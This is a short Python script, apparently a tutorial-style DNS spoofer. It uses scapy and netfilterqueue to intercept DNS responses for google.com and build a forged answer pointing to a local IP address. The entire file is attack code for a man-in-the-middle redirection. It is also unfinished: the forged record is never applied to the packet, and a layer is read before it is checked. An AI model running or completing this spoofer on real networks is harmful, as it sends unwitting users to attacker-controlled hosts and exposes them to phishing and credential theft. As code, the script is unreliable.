import scapy.all as scapy
import netfilterqueue
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    qname =scapy_packet[scapy.DNSQR].qname
    if scapy_packet.haslayer(scapy.DNSRR):
        if "google.com" in qname:
            print("spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.12")
    packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
